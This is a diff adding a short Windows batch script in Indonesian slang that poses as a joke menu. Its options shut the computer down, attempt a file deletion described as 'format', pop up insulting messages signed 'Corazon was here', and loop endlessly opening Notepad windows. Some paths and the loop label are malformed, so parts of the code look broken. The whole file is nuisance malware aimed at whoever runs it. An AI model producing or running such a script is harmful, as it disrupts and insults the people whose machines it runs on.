@@ -1,0 +1,2 @@
+@echo off title Jawab nih Cuk! :menu cls echo Lu mau pilih yg mana nih :D? pause echo pilih yang mana: echo 1. Matiin komputer echo 2. Format aja echo 3. Nangis echo 4. Beli komputer baru set input=nothing set /p input=Choice: if %input%==1 shutdown -s -t 30 if %input%==2 del c:xxx if %input%==3 @ECHO off msg * Muka lu ke yarrak msg * Jangan Marah ya :v! msg * Atau, CPU lu gw acak-acak :D msg * Mending, install ulang Tod :v msg * Corazon was here @ECHO off :top START %SystemRoot% system32notepad.exe GOTO to
+
